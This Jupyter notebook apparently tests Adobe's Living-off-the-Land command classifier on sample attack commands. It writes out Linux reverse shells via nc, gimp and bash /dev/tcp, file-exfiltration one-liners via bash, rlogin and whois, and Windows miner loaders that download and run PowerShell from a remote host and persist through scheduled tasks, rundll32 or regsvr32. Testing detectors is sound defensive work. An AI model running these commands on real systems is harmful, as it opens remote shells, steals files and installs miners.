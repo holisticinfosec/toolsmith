{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# HolisticInfoSec LotL Classifier scenario tests\n",
    "\n",
    "Living off the Land (LotL) Classifier: https://github.com/adobe/libLOL  \n",
    "Living off the Land (LotL) Classifier Open-Source Project: https://medium.com/adobetech/living-off-the-land-lotl-classifier-open-source-project-b167484c8187\n",
    "\n",
    "This notebook extends the project's quick start examples to three distinct scenarios (categories) derived from GTFOBins, LOLBAS, and realworld analysis. These include Linux reverse shells, Linux file uploads (exfil), and Windows coin miners.\n",
    "\n",
    "This effort is supported by the related toolsmith #146 article  https://holisticinfosec.io/post/lotl/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Linux reverse shell "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# from GTFOBins: reverse shell examples via nc, gimp, and bash\n",
    "# https://gtfobins.github.io/#+reverse%20shellc\n",
    "\n",
    "from lol.api import LOLC, PlatformType\n",
    "lolc=LOLC(PlatformType.LINUX) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS\n",
    "commands=['nc -e /bin/sh $RHOST $RPORT',\n",
    "          'gimp -idf --batch-interpreter=python-fu-eval -b import sys,socket,os,pty;s=socket.socket()',\n",
    "          'bash -c exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1']\n",
    "classification, tags = lolc(commands)\n",
    "for command, status, tag in zip (commands, classification, tags):\n",
    "    print(command)\n",
    "    print(status)\n",
    "    print(tag)\n",
    "    print(\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Linux file uploads (exfil)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# from GTFOBins: file uploads (exfil) examples via bash, rlogin, and whois\n",
    "# https://gtfobins.github.io/#+file%20upload\n",
    "\n",
    "from lol.api import LOLC, PlatformType\n",
    "lolc=LOLC(PlatformType.LINUX) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS\n",
    "commands=['bash -c echo -e POST / HTTP/0.9\\n\\n$(<$LFILE) > /dev/tcp/$RHOST/$RPORT',\n",
    "          'rlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST',\n",
    "          'whois -h $RHOST -p $RPORT base64 $LFILE']\n",
    "classification, tags = lolc(commands)\n",
    "for command, status, tag in zip (commands, classification, tags):\n",
    "    print(command)\n",
    "    print(status)\n",
    "    print(tag)\n",
    "    print(\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Windows coin miners"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# LOLBINS miner commands from https://lolbas-project.github.io/ \n",
    "# LOLBINS rundll32 execution: https://lolbas-project.github.io/lolbas/Binaries/Rundll32/#execute\n",
    "# LOLBINS regsvr32 execution: https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/#execute\n",
    "# References: \n",
    "# WannaMine: https://www.accenture.com/_acnmedia/pdf-46/accenture-threat-analysis-monero-wannamine.pdf\n",
    "# https://logrhythm.com/blog/how-to-enable-process-creation-events-to-track-malware-and-threat-actor-activity/\n",
    "\n",
    "from lol.api import LOLC, PlatformType\n",
    "lolc=LOLC(PlatformType.WINDOWS) # allowed parameters are PlatformType.LINUX and PlatformType.WINDOWS\n",
    "commands=['cmd /c echo powershell -nop $a=([string](Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding ));if(($a -eq $null) -or (!($a.contains(SCM Event Filter)))) {IEX(New-Object Net.WebClient).DownloadString(http://stafftest.spdns.eu:8000/mate6.ps1)} >%temp%\\y1.bat && SCHTASKS /create /RU System /SC DAILY /TN yastcat /f /TR %temp%\\y1.bat &&SCHTASKS /run /TN yastcat',\n",
    "          'rundll32.exe javascript:\\..\\mshtml,RunHTMLApplication;document.write();new%20ActiveXObject(WScript.Shell).Run(powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(http://ip:port/);',\n",
    "          'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll']\n",
    "classification, tags = lolc(commands)\n",
    "for command, status, tag in zip (commands, classification, tags):\n",
    "    print(command)\n",
    "    print(status)\n",
    "    print(tag)\n",
    "    print(\"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
